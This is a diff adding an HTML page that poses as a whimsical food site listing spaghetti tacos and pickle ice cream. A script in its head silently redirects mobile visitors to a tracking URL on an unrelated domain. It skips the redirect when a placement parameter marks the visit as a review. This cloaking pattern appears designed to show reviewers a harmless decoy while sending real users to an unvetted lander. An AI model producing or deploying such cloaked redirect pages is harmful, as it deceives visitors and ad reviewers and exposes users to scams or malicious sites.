@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quirky Culinary Adventures</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background-color: #FFD700;
+            color: #8B4513;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .food-item {
+            background-color: #98FB98;
+            border-radius: 15px;
+            margin: 10px;
+            padding: 15px;
+            width: 200px;
+            text-align: center;
+        }
+        footer {
+            background-color: #4B0082;
+            color: #FFFFFF;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00CED1;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Quirky Culinary Adventures!</h1>
+    </header>
+    <main>
+        <div class="food-item">
+            <h2>Spaghetti Tacos</h2>
+            <p>A bizarre fusion of Italian and Mexican cuisines!</p>
+        </div>
+        <div class="food-item">
+            <h2>Pickle Ice Cream</h2>
+            <p>For those who like their desserts with a tangy twist!</p>
+        </div>
+        <div class="food-item">
+            <h2>Chocolate Covered Bacon</h2>
+            <p>The perfect blend of sweet and savory!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Quirky Culinary Adventures | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
